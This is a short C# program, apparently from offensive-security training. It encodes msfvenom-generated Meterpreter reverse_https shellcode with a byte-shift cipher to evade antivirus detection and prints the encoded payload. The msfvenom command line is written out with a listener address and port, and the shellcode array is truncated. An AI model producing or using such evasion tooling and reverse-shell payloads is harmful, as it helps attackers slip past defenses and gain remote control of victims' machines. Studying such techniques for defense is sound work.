using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // ORIGINAL SHELLCODE BYTES
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.1 LPORT=443 -f csharp
            byte[] buf = new byte[752] {0xfc, 0x48, 0x83, 0xe4, ...

            // Encrypt shellcode by adding 2 to each byte (Caesar cipher)
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            // Convert encrypted shellcode to formatted string for output
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
